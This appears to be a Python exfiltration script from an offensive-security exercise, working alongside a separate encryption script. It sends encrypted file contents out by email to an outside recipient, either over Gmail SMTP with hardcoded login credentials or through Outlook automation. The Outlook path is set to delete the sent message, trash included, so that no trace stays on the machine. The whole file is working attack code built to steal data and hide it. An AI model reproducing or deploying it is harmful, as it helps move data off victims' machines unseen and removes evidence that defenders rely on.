import smtplib  # Required for cross-platform email function.
import time
import win32com.client  # Used to write windows specific functions.

# Information required to initiate an SMTP client.
smtp_server = 'smtp.gmail.com'
smtp_port = 587
smtp_acct = 'kali@gmail.com'
smtp_password = 'kaliWTF'
tgt_accts = ['ilak@RecipientDomain.com']

# platform independent emailing function
def plain_email(subject, contents):
    # The subject will be the name of the file with data to be exfiltrated.
    message = f'Subject: {subject}\nFrom {smtp_acct}\n'
    # The content will be the encrypted information (from 1.Crypter.py).
    message += f'To: {tgt_accts}\n\n{contents.decode()}'
    server = smtplib.SMTP(smtp_server, smtp_port)
    server.starttls()
    # Connect and login with account name and password.
    server.login(smtp_acct, smtp_password)

    # The next line can be uncommented to troubleshoot any issues.
    # server.set_debuglevel(1)
    # Invoke the 'sendmail' function to authenticate and send the exfiltration email.
    server.sendmail(smtp_acct, tgt_accts, message)
    time.sleep(1)
    server.quit()

# Takes same arguments as plain email.
def outlook(subject, contents):
    # Used the win32.com to create an instance of outlook application.
    outlook = win32com.client.Dispatch("Outlook.Application")
    message = outlook.CreateItem(0)
    # Ensures the email is deleted after submitting (Including trash).
    message.DeleteAfterSubmit = True
    message.Subject = subject
    message.Body = contents.decode()
    message.To = tgt_accts[0]
    message.Send()

# Fixed the issue were the content was STR, but the script expects bytes by adding b''.
if __name__ == '__main__':
    plain_email('test2 message', b'attack at dawn.')

# Received emails will have to be decoded with the 1.Crypter.py.
